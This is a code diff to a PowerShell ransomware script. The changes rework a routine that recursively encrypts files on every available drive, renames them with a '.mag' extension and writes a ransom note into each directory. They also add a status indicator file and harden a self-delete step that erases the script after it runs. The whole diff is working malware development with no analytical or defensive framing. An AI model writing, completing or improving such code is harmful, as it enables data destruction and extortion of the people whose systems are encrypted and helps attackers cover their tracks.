@@ -89,7 +89,14 @@ function Encrypt-Files {
         [string[]]$TargetDirectories
     )
 
+    # Write an indicator file to the root directory of each target
+    $IndicatorFile = "C:\encryption_indicator.txt"
+    Add-Content -Path $IndicatorFile -Value "Encryption started at $(Get-Date)" -Force
+
+    Write-Host "=== Encryption Process Started ===" -ForegroundColor Red
+
     foreach ($TargetDirectory in $TargetDirectories) {
+        Write-Host "Encrypting files in directory: $TargetDirectory" -ForegroundColor Yellow
         Get-ChildItem -Path $TargetDirectory -Recurse -File | ForEach-Object {
             $FilePath = $_.FullName
             $NewFilePath = "${FilePath}.mag"
@@ -101,17 +108,32 @@ function Encrypt-Files {
                 Write-Host "Failed to encrypt ${FilePath}: $_" -ForegroundColor Yellow
             }
         }
+
+        # Create a ransom note in the directory
         Create-RansomNote -TargetDirectory $TargetDirectory -NoteContent $DecodedNote
     }
+
+    Write-Host "=== Encryption Process Completed ===" -ForegroundColor Green
+
+    # Append to the indicator file
+    Add-Content -Path $IndicatorFile -Value "Encryption completed at $(Get-Date)" -Force
 }
 
 function Self-Delete {
-    $ScriptPath = $MyInvocation.MyCommand.Path
+    param (
+        [string]$ScriptPath = $MyInvocation.MyCommand.Path
+    )
+
+    if (-not $ScriptPath) {
+        Write-Host "Script path is null. Self-delete cannot proceed." -ForegroundColor Yellow
+        return
+    }
+
     try {
         Remove-Item -Path $ScriptPath -Force
         Write-Host "Script $ScriptPath has been deleted." -ForegroundColor Green
     } catch {
-        Write-Host "Failed to delete script ${ScriptPath}: $_" -ForegroundColor Yellow
+        Write-Host "Failed to delete script: $_" -ForegroundColor Yellow
     }
 }
 
@@ -138,7 +160,9 @@ function Main {
     # Get all available drives
     $AvailableDrives = Get-AvailableDrives
     Encrypt-Files -EncryptionKey $EncryptionKey -TargetDirectories $AvailableDrives
-    Self-Delete
+
+    # Pass the script's path explicitly
+    Self-Delete -ScriptPath $MyInvocation.MyCommand.Path
 }
 
 # Execute the script with the provided execution key
